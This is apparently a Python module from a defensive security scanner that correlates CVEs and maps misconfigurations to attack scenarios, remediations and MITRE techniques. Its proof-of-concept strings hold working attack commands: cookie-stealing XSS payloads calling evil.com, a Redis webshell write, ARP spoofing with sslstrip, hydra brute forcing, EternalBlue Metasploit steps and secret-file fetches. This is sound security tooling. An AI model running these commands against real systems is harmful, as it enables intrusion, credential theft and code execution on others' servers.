"""Vulnerability correlation — CPE-based CVE lookup and misconfiguration checks."""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Any

import requests  # type: ignore[import-untyped]

from models import (
    CVERecord,
    Finding,
    FindingCategory,
    MisconfigurationCheck,
    Severity,
    TOOL_REFERENCE,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# NVD API CVE lookup (public, rate-limited)
# ---------------------------------------------------------------------------

_NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
_NVD_RATE_LIMIT = 6.0  # seconds between NVD calls (public API limit)

# CISA Known Exploited Vulnerabilities catalog (public JSON feed)
_CISA_KEV_API = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"

# In-process cache: CPE string → list[CVERecord]
_cve_cache: dict[str, list[CVERecord]] = {}
# CISA KEV set: CVE IDs known to be actively exploited
_kev_cache: set[str] | None = None


def _normalize_cpe23(cpe: str) -> str:
    """Return a full 13-field CPE 2.3 string, padding omitted fields with '*'.

    The scanner often detects products without exact versions. NVD's
    virtualMatchString parameter accepts wildcarded CPE 2.3 values, so we
    normalize partial product identifiers instead of dropping CVE correlation.
    """
    parts = cpe.split(":")
    if len(parts) < 5 or parts[:2] != ["cpe", "2.3"]:
        return ""
    if len(parts) > 13:
        return ""
    return ":".join(parts + ["*"] * (13 - len(parts)))


def _cvss_to_severity(score: float) -> Severity:
    if score >= 9.0:
        return Severity.CRITICAL
    if score >= 7.0:
        return Severity.HIGH
    if score >= 4.0:
        return Severity.MEDIUM
    if score > 0:
        return Severity.LOW
    return Severity.INFO


def _load_cisa_kev(timeout: float = 10.0) -> set[str]:
    """Fetch the CISA KEV catalog and return a set of CVE IDs. Cached per process."""
    global _kev_cache
    if _kev_cache is not None:
        return _kev_cache
    try:
        resp = requests.get(
            _CISA_KEV_API,
            timeout=timeout,
            headers={"User-Agent": "Inquisition/0.1 SecurityScanner"},
        )
        if resp.status_code == 200:
            data = resp.json()
            _kev_cache = {v["cveID"] for v in data.get("vulnerabilities", [])}
            logger.info("Loaded %d CVEs from CISA KEV catalog", len(_kev_cache))
            return _kev_cache
    except Exception as exc:
        logger.warning("Could not fetch CISA KEV catalog: %s", exc)
    _kev_cache = set()
    return _kev_cache


def lookup_cves_for_cpe(cpe: str, timeout: float = 15.0) -> list[CVERecord]:
    """Query the NVD API for CVEs matching a CPE string.

    This is a best-effort lookup.  Returns an empty list on any error.
    """
    if not cpe:
        return []

    cpe_match = _normalize_cpe23(cpe)
    if not cpe_match:
        return []

    if cpe_match in _cve_cache:
        return _cve_cache[cpe_match]

    params: dict[str, str] = {
        "virtualMatchString": cpe_match,
        "resultsPerPage": "10",
    }

    try:
        time.sleep(_NVD_RATE_LIMIT)  # respect rate limit
        resp = requests.get(
            _NVD_API,
            params=params,
            timeout=timeout,
            headers={"User-Agent": "Inquisition/0.1 SecurityScanner"},
        )
        if resp.status_code != 200:
            logger.warning("NVD API returned HTTP %d for CPE %s — CVE data may be incomplete", resp.status_code, cpe)
            return []

        data: dict[str, Any] = resp.json()
    except (requests.RequestException, ValueError) as exc:
        logger.warning("NVD lookup failed for CPE %s: %s — CVE data may be incomplete", cpe, exc)
        return []

    kev_ids = _load_cisa_kev(timeout=timeout)
    now = datetime.now(timezone.utc)

    records: list[CVERecord] = []
    for vuln in data.get("vulnerabilities", []):
        cve_item = vuln.get("cve", {})
        cve_id = cve_item.get("id", "")
        descriptions = cve_item.get("descriptions", [])
        desc = next(
            (d["value"] for d in descriptions if d.get("lang") == "en"),
            "No description available",
        )

        metrics = cve_item.get("metrics", {})
        score = 0.0
        for metric_version in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            metric_list = metrics.get(metric_version, [])
            if metric_list:
                cvss_data = metric_list[0].get("cvssData", {})
                score = cvss_data.get("baseScore", 0.0)
                break

        refs = [
            r.get("url", "")
            for r in cve_item.get("references", [])[:5]
            if r.get("url")
        ]

        # Compute days since public disclosure
        days_since = 0
        published_str = cve_item.get("published", "")
        if published_str:
            try:
                published = datetime.fromisoformat(published_str.rstrip("Z")).replace(tzinfo=timezone.utc)
                days_since = max(0, (now - published).days)
            except ValueError:
                pass

        records.append(CVERecord(
            cve_id=cve_id,
            description=desc[:500],
            severity=_cvss_to_severity(score),
            cvss_score=score,
            references=refs,
            days_since_disclosure=days_since,
            in_cisa_kev=cve_id in kev_ids,
        ))

    _cve_cache[cpe_match] = records
    return records


# ---------------------------------------------------------------------------
# Misconfiguration checks derived from findings
# ---------------------------------------------------------------------------

_MISCONFIG_RULES: list[dict[str, Any]] = [
    {
        "categories": [FindingCategory.HTTP_HEADER],
        "title_contains": "Missing header: Strict-Transport-Security",
        "name": "HSTS not enabled",
        "description": "HTTP Strict Transport Security header missing",
        "severity": Severity.MEDIUM,
        "remediation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains",
        "attack_scenario": "Attacker on shared Wi-Fi runs sslstrip. User navigates to http://target.com, attacker intercepts the HTTP request before it can redirect to HTTPS, serves a forged HTTP page. User submits login form over HTTP — credentials arrive in cleartext at the attacker's proxy.",
        "mitre_techniques": ["T1557", "T1040"],
        "poc_command": "bettercap -iface eth0 -eval \"set arp.spoof.targets 192.168.1.5; arp.spoof on; set http.proxy.sslstrip true; http.proxy on\"",
    },
    {
        "categories": [FindingCategory.HTTP_HEADER],
        "title_contains": "Missing header: Content-Security-Policy",
        "name": "CSP not configured",
        "description": "Content-Security-Policy header missing",
        "severity": Severity.MEDIUM,
        "remediation": "Implement a Content-Security-Policy that restricts script sources",
        "attack_scenario": "Attacker finds an XSS vulnerability in a search field. Without CSP, they inject <script src='https://evil.com/steal.js'></script>. The injected script reads document.cookie and exfiltrates the session token to the attacker's server, enabling account takeover.",
        "mitre_techniques": ["T1059.007", "T1185", "T1539"],
        "poc_command": "# Test for XSS without CSP:\ncurl -s 'https://target.com/search?q=<script>fetch(\"https://evil.com?c=\"+document.cookie)</script>' | grep '<script>'",
    },
    {
        "categories": [FindingCategory.TLS],
        "title_contains": "Deprecated TLS version",
        "name": "Legacy TLS enabled",
        "description": "Server supports deprecated TLS protocol versions",
        "severity": Severity.HIGH,
        "remediation": "Disable TLS 1.0 and TLS 1.1; require TLS 1.2+",
        "attack_scenario": "Attacker performs ARP poisoning to become the MITM, then forces a TLS downgrade to TLS 1.0 using bettercap. They exploit POODLE (CVE-2014-3566) via a CBC padding oracle attack to decrypt session cookies byte-by-byte and hijack the authenticated session.",
        "mitre_techniques": ["T1557.002", "T1040", "T1185"],
        "poc_command": "testssl.sh --protocols target.com\n# Verify TLS 1.0 acceptance:\nopenssl s_client -tls1 -connect target.com:443",
    },
    {
        "categories": [FindingCategory.TLS],
        "title_contains": "Self-signed certificate",
        "name": "Self-signed certificate in use",
        "description": "Certificate not issued by a trusted CA",
        "severity": Severity.MEDIUM,
        "remediation": "Obtain a certificate from a trusted CA (e.g. Let's Encrypt)",
        "attack_scenario": "Users have been trained to click through certificate warnings on this site. Attacker performs ARP spoofing and presents their own self-signed certificate during MITM. Because users expect a cert warning, many click 'Accept' — granting the attacker full visibility into the encrypted session.",
        "mitre_techniques": ["T1557", "T1185"],
        "poc_command": "mitmproxy --mode transparent --ssl-insecure\n# ARP spoof first: arpspoof -i eth0 -t 192.168.1.100 192.168.1.1",
    },
    {
        "categories": [FindingCategory.TLS],
        "title_contains": "Certificate EXPIRED",
        "name": "Expired TLS certificate",
        "description": "The TLS certificate has expired",
        "severity": Severity.CRITICAL,
        "remediation": "Renew the certificate immediately",
        "attack_scenario": "An expired certificate means users must click through a security warning to reach the site. Attacker monitors CT logs for expired certs, then runs MITM attacks knowing users are already conditioned to ignore certificate errors on this domain.",
        "mitre_techniques": ["T1557", "T1040"],
        "poc_command": "openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates\n# Shows: notAfter=<past date>",
    },
    {
        "categories": [FindingCategory.TECH_STACK],
        "title_contains": ".env",
        "name": "Environment file publicly accessible",
        "description": ".env file exposed — may contain secrets",
        "severity": Severity.CRITICAL,
        "remediation": "Block access to .env via web-server configuration",
        "attack_scenario": "Attacker fetches /.env in a single HTTP request. The file contains DB_PASSWORD, AWS_SECRET_ACCESS_KEY, and APP_KEY. They use the AWS credentials to exfiltrate S3 buckets containing customer data, and the database password to dump all user records directly.",
        "mitre_techniques": ["T1552.001", "T1078"],
        "poc_command": "curl -s https://target.com/.env\ncurl -s https://target.com/.env.production\ncurl -s https://target.com/.env.backup",
    },
    {
        "categories": [FindingCategory.TECH_STACK],
        "title_contains": ".git",
        "name": "Git repository exposed",
        "description": ".git directory accessible over HTTP",
        "severity": Severity.HIGH,
        "remediation": "Block access to .git/ via web-server configuration",
        "attack_scenario": "Attacker uses git-dumper to reconstruct the full repository from HTTP. They run `git log --all` to find a commit that removed database credentials, read that old version of the config file, and connect directly to the production database.",
        "mitre_techniques": ["T1083", "T1552"],
        "poc_command": "git-dumper https://target.com/.git/ ./stolen-repo\ncd stolen-repo && git log --all --oneline\ngit show HEAD~3:config/database.yml",
    },
    {
        "categories": [FindingCategory.PORT],
        "title_contains": "Telnet",
        "name": "Telnet service exposed",
        "description": "Telnet transmits data in cleartext",
        "severity": Severity.HIGH,
        "remediation": "Disable Telnet and migrate to SSH",
        "attack_scenario": "Attacker runs tcpdump on the network path to the Telnet server. Every keystroke — username, password, and subsequent commands — is captured in cleartext. Attacker waits for an admin to log in, records the session, and replays the credentials later.",
        "mitre_techniques": ["T1040", "T1021", "T1557"],
        "poc_command": "tcpdump -i eth0 -A 'port 23' | grep -A5 'login\\|Password'\n# Or actively intercept with Wireshark filter: tcp.port == 23",
    },
    {
        "categories": [FindingCategory.PORT],
        "title_contains": "6379/Redis",
        "name": "Redis exposed to internet",
        "description": "Redis is accessible without authentication from the public internet",
        "severity": Severity.HIGH,
        "remediation": "Bind Redis to localhost; add requirepass; block port 6379 at firewall",
        "attack_scenario": "Attacker connects with redis-cli, sets Redis's working directory to /var/www/html and saves a PHP webshell as a .php file using BGSAVE. They then execute arbitrary OS commands by hitting the webshell URL, achieving full Remote Code Execution on the server.",
        "mitre_techniques": ["T1021", "T1505.003", "T1078"],
        "poc_command": "redis-cli -h target.com CONFIG SET dir /var/www/html\nredis-cli -h target.com CONFIG SET dbfilename shell.php\nredis-cli -h target.com SET payload '<?php system($_GET[\"cmd\"]); ?>'\nredis-cli -h target.com BGSAVE",
    },
    {
        "categories": [FindingCategory.PORT],
        "title_contains": "9200/Elasticsearch",
        "name": "Elasticsearch exposed to internet",
        "description": "Elasticsearch API is publicly reachable with no authentication",
        "severity": Severity.HIGH,
        "remediation": "Bind to private network; enable X-Pack Security; block port 9200 at firewall",
        "attack_scenario": "Attacker queries /_cat/indices to discover all index names, then dumps the 'users' index with a wildcard search. Thousands of user records including emails, hashed passwords, and PII are exfiltrated in minutes using a single API call.",
        "mitre_techniques": ["T1530", "T1083"],
        "poc_command": "curl -s http://target.com:9200/_cat/indices?v\ncurl -s 'http://target.com:9200/users/_search?q=*&size=10000' | python3 -m json.tool",
    },
    {
        "categories": [FindingCategory.PORT],
        "title_contains": "3389/RDP",
        "name": "RDP exposed to internet",
        "description": "Remote Desktop Protocol is reachable from the public internet",
        "severity": Severity.MEDIUM,
        "remediation": "Restrict RDP behind VPN or firewall; enable NLA; apply BlueKeep patches",
        "attack_scenario": "Attacker scans for CVE-2019-0708 (BlueKeep) against open RDP ports. Unpatched systems are exploited with a single packet for unauthenticated SYSTEM-level access — no credentials needed. Alternatively, attacker brute-forces credentials at full speed with no lockout or geo-restriction.",
        "mitre_techniques": ["T1021.001", "T1110", "T1190"],
        "poc_command": "nmap -p 3389 --script rdp-vuln-ms12-020 target.com\n# Brute force (authorized only):\nhydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://target.com",
    },
    {
        "categories": [FindingCategory.TLS],
        "title_contains": "Weak cipher",
        "name": "Weak TLS cipher suite in use",
        "description": "Server negotiated a cryptographically broken cipher suite",
        "severity": Severity.HIGH,
        "remediation": "Restrict cipher suites to ECDHE+AES-GCM and ChaCha20-Poly1305 families",
        "attack_scenario": "Attacker passively records TLS sessions encrypted with 3DES. After accumulating 32 GB of traffic on the same session key (SWEET32 birthday attack), statistical analysis of 64-bit block collisions allows decryption of targeted plaintext bytes including session tokens.",
        "mitre_techniques": ["T1557.002", "T1040"],
        "poc_command": "testssl.sh --cipher-per-proto target.com\nopenssl s_client -cipher RC4-SHA -connect target.com:443\n# Vulnerable: handshake succeeds",
    },
    {
        "categories": [FindingCategory.HTTP_HEADER],
        "title_contains": "Missing header: X-Frame-Options",
        "name": "Clickjacking protection absent",
        "description": "X-Frame-Options header missing — page can be embedded in iframes",
        "severity": Severity.LOW,
        "remediation": "Add X-Frame-Options: DENY or use CSP frame-ancestors 'none'",
        "attack_scenario": "Attacker creates a page with a transparent iframe over the target's account-deletion page. A 'click to win' button is positioned over the invisible 'Confirm Delete' button. When the victim clicks, their authenticated browser submits the deletion request.",
        "mitre_techniques": ["T1185", "T1204.001"],
        "poc_command": "<!-- Clickjacking PoC: -->\n<iframe src='https://target.com/account/delete' style='opacity:0;position:absolute;top:0;left:0;width:100%;height:100%'></iframe>\n<button style='position:absolute;top:100px;left:50px'>Click here!</button>",
    },
    {
        "categories": [FindingCategory.HTTP_HEADER],
        "title_contains": "No HTTP-to-HTTPS redirect",
        "name": "Unencrypted HTTP served",
        "description": "HTTP requests are not redirected to HTTPS",
        "severity": Severity.MEDIUM,
        "remediation": "Configure a 301 redirect from port 80 to HTTPS and enable HSTS",
        "attack_scenario": "User types target.com in their browser. Without a redirect, the browser connects via HTTP. An attacker on the network passively captures the full session — login credentials, session cookies, and API tokens — in cleartext using Wireshark.",
        "mitre_techniques": ["T1040", "T1557"],
        "poc_command": "curl -v http://target.com/ 2>&1 | head -20\n# If response is 200 (not 301/302): traffic is unencrypted\ntcpdump -i eth0 -A 'host target.com and port 80' | grep -i cookie",
    },
    {
        "categories": [FindingCategory.APPLICATION],
        "title_contains": "CORS",
        "name": "Overly permissive CORS policy",
        "description": "CORS allows cross-origin requests from untrusted origins",
        "severity": Severity.MEDIUM,
        "remediation": "Restrict Access-Control-Allow-Origin to an explicit allowlist of trusted origins",
        "attack_scenario": "Victim visits evil.com while logged into target.com. The malicious page runs fetch('https://target.com/api/user', {credentials:'include'}) and sends the full JSON response (containing PII and tokens) to the attacker's server.",
        "mitre_techniques": ["T1185", "T1083"],
        "poc_command": "curl -sI -H 'Origin: https://evil.com' https://target.com/api/user | grep -i 'access-control'\n# Vulnerable: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true",
    },
    {
        "categories": [FindingCategory.HTTP_HEADER],
        "title_contains": "Insecure cookie",
        "name": "Session cookies lack security flags",
        "description": "Cookies missing Secure and/or HttpOnly flags",
        "severity": Severity.MEDIUM,
        "remediation": "Set Secure, HttpOnly, and SameSite=Strict on all authentication cookies",
        "attack_scenario": "Attacker injects a small XSS payload that calls fetch('https://evil.com?c='+document.cookie). Because HttpOnly is missing, JavaScript can read the session cookie and exfiltrate it. The attacker uses the stolen cookie to take over the session without knowing the password.",
        "mitre_techniques": ["T1539", "T1185"],
        "poc_command": "# Steal via XSS (HttpOnly missing):\n<script>fetch('https://evil.com/log?c='+encodeURIComponent(document.cookie))</script>\n# Capture via network (Secure flag missing):\ntcpdump -i eth0 -A 'port 80 and host target.com' | grep Cookie",
    },
    {
        "categories": [FindingCategory.APPLICATION],
        "title_contains": "PHP info",
        "name": "PHP configuration page exposed",
        "description": "phpinfo() page publicly accessible — full server configuration disclosed",
        "severity": Severity.HIGH,
        "remediation": "Remove phpinfo files from production immediately",
        "attack_scenario": "Attacker fetches /phpinfo.php and learns the exact PHP version (e.g. 7.4.3), all loaded extensions, and internal file paths. Cross-referencing with CVE databases reveals exploitable vulnerabilities in the specific version. The DOCUMENT_ROOT path helps them craft targeted path-traversal attempts.",
        "mitre_techniques": ["T1082", "T1552"],
        "poc_command": "curl -s https://target.com/phpinfo.php | grep -Ei 'PHP Version|DOCUMENT_ROOT|DB_PASSWORD|SECRET'\n# Common phpinfo paths:\nfor p in phpinfo.php info.php test.php php_info.php; do curl -so /dev/null -w \"%{http_code} /$p\\n\" https://target.com/$p; done",
    },
    {
        "categories": [FindingCategory.APPLICATION],
        "title_contains": "zone transfer succeeded",
        "name": "DNS zone transfer unrestricted",
        "description": "DNS AXFR succeeded — full zone contents exposed to any client",
        "severity": Severity.CRITICAL,
        "remediation": "Restrict AXFR to authorised secondary nameserver IPs only",
        "attack_scenario": "Attacker runs a zone transfer (AXFR) and receives the complete DNS zone file: every internal server, VPN gateway, mail server, and staging environment. They pivot to the unpatched staging server (dev.target.com), compromise it, and use it as a launch pad into the production network.",
        "mitre_techniques": ["T1590.002", "T1046"],
        "poc_command": "dig AXFR @ns1.target.com target.com\n# Extract all A records:\ndig AXFR @ns1.target.com target.com | grep -E 'IN\\s+A\\s' | awk '{print $1, $5}'",
    },
    {
        "categories": [FindingCategory.DNS],
        "title_contains": "subdomain takeover",
        "name": "Potential subdomain takeover via dangling CNAME",
        "description": "CNAME points to unclaimed third-party resource — attacker may claim it",
        "severity": Severity.HIGH,
        "remediation": "Remove CNAME record or re-create the third-party resource",
        "attack_scenario": "dev.target.com has a CNAME to a decommissioned Heroku app. Attacker claims the Heroku app name, now controls content served at dev.target.com. They serve a phishing login page that mimics target.com, or use the subdomain to bypass CSP policies that allow *.target.com.",
        "mitre_techniques": ["T1584.001", "T1608"],
        "poc_command": "dig CNAME dev.target.com\n# If CNAME target is unclaimed (e.g., xxx.s3-website-us-east-1.amazonaws.com):\naws s3api create-bucket --bucket xxx --region us-east-1\n# Now control content at dev.target.com",
    },
    {
        "categories": [FindingCategory.APPLICATION],
        "title_contains": "graphql introspection enabled",
        "name": "GraphQL introspection enabled in production",
        "description": "Full API schema is publicly enumerable via introspection",
        "severity": Severity.MEDIUM,
        "remediation": "Disable GraphQL introspection in production configuration",
        "attack_scenario": "Attacker runs a full introspection query to map every type, field, and mutation. They discover a `users` query with no authentication requirement that accepts an id argument. They iterate over IDs 1–100000, extracting all user emails, phone numbers, and SSNs through the public API.",
        "mitre_techniques": ["T1083", "T1190", "T1530"],
        "poc_command": "curl -s -X POST https://target.com/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}' | python3 -m json.tool",
    },
    {
        "categories": [FindingCategory.APPLICATION],
        "title_contains": "http trace method enabled",
        "name": "HTTP TRACE method enabled",
        "description": "TRACE method enabled — Cross-Site Tracing (XST) risk",
        "severity": Severity.MEDIUM,
        "remediation": "Disable TRACE: Apache TraceEnable Off; Nginx return 405 on TRACE",
        "attack_scenario": "Attacker combines XST with XSS: injected JavaScript sends a TRACE request to target.com. The server echoes all request headers in the response body — including the HttpOnly session cookie, which normally JavaScript cannot read. The script then exfiltrates the cookie.",
        "mitre_techniques": ["T1185", "T1566"],
        "poc_command": "curl -s -X TRACE https://target.com/ -H 'X-Custom: steal-me' -v 2>&1 | grep -A5 '< HTTP'\n# XST payload (requires XSS):\nfetch('/','method':'TRACE').then(r=>r.text()).then(b=>fetch('https://evil.com?d='+btoa(b)))",
    },
    {
        "categories": [FindingCategory.APPLICATION],
        "title_contains": "sensitive file exposed",
        "name": "Sensitive file publicly accessible",
        "description": "Backup, config, or secret file exposed in web root",
        "severity": Severity.CRITICAL,
        "remediation": "Remove file from web root; rotate any exposed credentials; block via web-server config",
        "attack_scenario": "Attacker discovers backup.sql.gz in the web root. Download and extraction reveals the full users table with bcrypt-hashed passwords. They run hashcat with rockyou.txt, recovering 30% of passwords within hours. These are used for credential stuffing against the live site and other services.",
        "mitre_techniques": ["T1552.001", "T1083"],
        "poc_command": "for f in backup.sql.gz db.sql.gz config.php.bak .env.bak wp-config.bak; do\n  code=$(curl -so /dev/null -w '%{http_code}' https://target.com/$f)\n  [ \"$code\" = \"200\" ] && echo \"EXPOSED: https://target.com/$f\"\ndone",
    },
    {
        "categories": [FindingCategory.APPLICATION],
        "title_contains": "admin panel accessible",
        "name": "Admin panel publicly accessible",
        "description": "Management interface reachable from the internet without restriction",
        "severity": Severity.HIGH,
        "remediation": "Restrict admin panel to VPN or trusted IP ranges",
        "attack_scenario": "Attacker runs a credential-stuffing tool with a breached password list against /admin/login. With no IP restriction, CAPTCHA, or rate limiting, they attempt 10,000 combinations per minute. 1-in-50 breached credentials succeed, granting admin access.",
        "mitre_techniques": ["T1078", "T1110.004", "T1190"],
        "poc_command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt https-form-post://target.com/admin/login:'username=^USER^&password=^PASS^:Invalid'\n# Also test default creds: admin/admin, admin/password, admin/123456",
    },
    {
        "categories": [FindingCategory.PORT],
        "title_contains": "445/SMB",
        "name": "SMB exposed to internet",
        "description": "SMB/CIFS port 445 reachable from internet — EternalBlue/WannaCry risk",
        "severity": Severity.CRITICAL,
        "remediation": "Block TCP 445 at firewall; disable SMBv1; apply MS17-010 patch",
        "attack_scenario": "Attacker exploits EternalBlue (MS17-010, CVE-2017-0144) — the exact vulnerability used by WannaCry and NotPetya — against the exposed port 445. A single exploit attempt against an unpatched Windows system yields SYSTEM-level remote code execution in seconds, no credentials required.",
        "mitre_techniques": ["T1021.002", "T1210", "T1570"],
        "poc_command": "nmap -p 445 --script smb-vuln-ms17-010 target.com\n# Metasploit (authorized only):\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target.com\nrun",
    },
    {
        "categories": [FindingCategory.PORT],
        "title_contains": "5900/VNC",
        "name": "VNC exposed to internet",
        "description": "VNC remote desktop port accessible from public internet",
        "severity": Severity.HIGH,
        "remediation": "Restrict VNC to localhost; use VPN for remote desktop access",
        "attack_scenario": "Attacker connects to VNC on port 5900. Many VNC servers have no authentication or weak 4-digit PINs. Once connected, the attacker has full graphical desktop control — they can read files, run commands, install malware, and access anything visible on the screen.",
        "mitre_techniques": ["T1021.005", "T1110"],
        "poc_command": "# Check for VNC authentication:\nnmap -p 5900 --script vnc-info,vnc-brute --script-args brute.mode=user target.com\n# Connect directly:\nvncviewer target.com:5900",
    },
]


def derive_misconfigurations(findings: list[Finding]) -> list[MisconfigurationCheck]:
    """Walk through findings and flag known misconfiguration patterns."""
    results: list[MisconfigurationCheck] = []
    seen: set[str] = set()

    for rule in _MISCONFIG_RULES:
        for finding in findings:
            if finding.category not in rule["categories"]:
                continue
            if rule["title_contains"].lower() not in finding.title.lower():
                continue
            if rule["name"] in seen:
                continue
            seen.add(rule["name"])
            results.append(MisconfigurationCheck(
                name=rule["name"],
                description=rule["description"],
                severity=rule["severity"],
                evidence=finding.evidence,
                remediation=rule["remediation"],
                attack_scenario=rule.get("attack_scenario", ""),
                mitre_techniques=list(rule.get("mitre_techniques", [])),
                poc_command=rule.get("poc_command", ""),
            ))

    return results


# ---------------------------------------------------------------------------
# Attack chain detection
# ---------------------------------------------------------------------------

@dataclass
class AttackChain:
    """A multi-step kill chain derived from a combination of findings."""

    name: str
    description: str
    steps: list[str]
    mitre_techniques: list[str]
    required_misconfig_names: list[str]  # names that must ALL be present


_ATTACK_CHAINS: list[AttackChain] = [
    AttackChain(
        name="SSL Stripping Credential Harvest",
        description="Missing HSTS + cleartext HTTP + insecure cookies allows an on-path attacker to strip TLS, intercept login credentials, and hijack the session.",
        steps=[
            "Attacker performs ARP poisoning to become the on-path MITM",
            "sslstrip/bettercap intercepts the victim's HTTP request before HTTPS redirect",
            "Login credentials submitted over HTTP arrive in cleartext at attacker proxy",
            "Attacker replays session cookies to impersonate the victim",
        ],
        mitre_techniques=["T1557", "T1040", "T1539", "T1185"],
        required_misconfig_names=["HSTS not enabled", "Unencrypted HTTP served"],
    ),
    AttackChain(
        name="Source Code Disclosure to Credential Extraction",
        description="Exposed .git directory allows full repository reconstruction. Attacker extracts hardcoded credentials from source history and uses them for direct database access.",
        steps=[
            "Attacker runs git-dumper against /.git to reconstruct the repository",
            "git log --all reveals commits that deleted credentials",
            "Attacker reads deleted config files with git show, extracting DB passwords",
            "Attacker connects directly to the database, bypassing the application layer",
        ],
        mitre_techniques=["T1083", "T1552", "T1078"],
        required_misconfig_names=["Git repository exposed"],
    ),
    AttackChain(
        name="Environment Secrets to Full Compromise",
        description="Exposed .env file contains cloud credentials and database passwords, enabling both data exfiltration and infrastructure takeover.",
        steps=[
            "Attacker fetches /.env — a single HTTP request",
            "AWS_SECRET_ACCESS_KEY extracted → attacker lists and downloads all S3 buckets",
            "DB_PASSWORD extracted → attacker dumps entire production database",
            "APP_KEY extracted → attacker forges authenticated session tokens",
        ],
        mitre_techniques=["T1552.001", "T1078", "T1530"],
        required_misconfig_names=["Environment file publicly accessible"],
    ),
    AttackChain(
        name="Unauthenticated Redis to Remote Code Execution",
        description="Internet-exposed Redis allows file writes to the web server root, turning a data-store exposure into full OS-level code execution.",
        steps=[
            "Attacker connects to Redis on port 6379 with redis-cli — no password required",
            "CONFIG SET dir /var/www/html sets Redis working directory to the web root",
            "CONFIG SET dbfilename shell.php + SET webshell '<?php system($_GET[cmd]); ?>'",
            "BGSAVE writes the PHP file to disk — attacker now has a webshell at /shell.php",
            "Attacker executes arbitrary OS commands via https://target.com/shell.php?cmd=id",
        ],
        mitre_techniques=["T1021", "T1505.003", "T1059"],
        required_misconfig_names=["Redis exposed to internet"],
    ),
    AttackChain(
        name="DNS Zone Transfer to Internal Network Pivot",
        description="Unrestricted AXFR reveals internal infrastructure. Attacker identifies and targets unpatched internal hosts invisible to external scanning.",
        steps=[
            "Attacker performs AXFR: dig AXFR @ns1.target.com target.com",
            "Full zone dump reveals dev.target.com, vpn.target.com, db.target.com",
            "Attacker scans dev/staging server — finds it runs an unpatched web framework",
            "Attacker compromises staging server and uses it as pivot into production network",
        ],
        mitre_techniques=["T1590.002", "T1046", "T1021"],
        required_misconfig_names=["DNS zone transfer unrestricted"],
    ),
    AttackChain(
        name="XSS to Session Hijacking (No CSP + No HttpOnly)",
        description="Missing CSP and insecure cookies combine to turn any XSS vulnerability into a direct account takeover without needing to bypass any browser protections.",
        steps=[
            "Attacker finds a reflected or stored XSS injection point",
            "Without CSP, injected <script> tags load attacker's external scripts freely",
            "Without HttpOnly, document.cookie exposes the full session token to JavaScript",
            "Stolen cookie is exfiltrated via fetch() to attacker's server",
            "Attacker replays the session token to take over the account",
        ],
        mitre_techniques=["T1059.007", "T1539", "T1185"],
        required_misconfig_names=["CSP not configured", "Session cookies lack security flags"],
    ),
    AttackChain(
        name="EternalBlue Internet Exposure to Network Ransomware",
        description="SMB port 445 exposed to the internet + EternalBlue unpatched = unauthenticated SYSTEM access. This is exactly the WannaCry/NotPetya attack path.",
        steps=[
            "Automated scanner finds port 445 open from the internet",
            "EternalBlue (CVE-2017-0144) exploit achieves SYSTEM-level RCE in seconds",
            "Attacker installs ransomware or a persistent backdoor",
            "SMB shares are used for lateral movement to other internal hosts",
        ],
        mitre_techniques=["T1190", "T1210", "T1021.002", "T1570"],
        required_misconfig_names=["SMB exposed to internet"],
    ),
    AttackChain(
        name="Subdomain Takeover to Phishing / CSP Bypass",
        description="Dangling CNAME on a subdomain lets attacker serve content from a trusted company subdomain, bypassing CSP and fooling users who recognize the domain.",
        steps=[
            "Attacker finds dev.target.com CNAME points to unclaimed resource",
            "Attacker claims the resource on the third-party platform",
            "Attacker serves a convincing phishing login page at dev.target.com",
            "Any CSP on target.com that allows *.target.com is bypassed by this subdomain",
            "Users trust the subdomain — phishing success rate is high",
        ],
        mitre_techniques=["T1584.001", "T1608", "T1566"],
        required_misconfig_names=["Potential subdomain takeover via dangling CNAME"],
    ),
]


def detect_attack_chains(misconfigs: list[MisconfigurationCheck]) -> list[AttackChain]:
    """Return attack chains triggered by the current set of misconfigurations."""
    active_names = {mc.name for mc in misconfigs}
    triggered: list[AttackChain] = []
    for chain in _ATTACK_CHAINS:
        if all(name in active_names for name in chain.required_misconfig_names):
            triggered.append(chain)
    return triggered


# ---------------------------------------------------------------------------
# Tool reference helper
# ---------------------------------------------------------------------------

def tools_for_category(category: FindingCategory) -> list[str]:
    """Return the list of open-source tools relevant to a finding category."""
    return TOOL_REFERENCE.get(category, [])
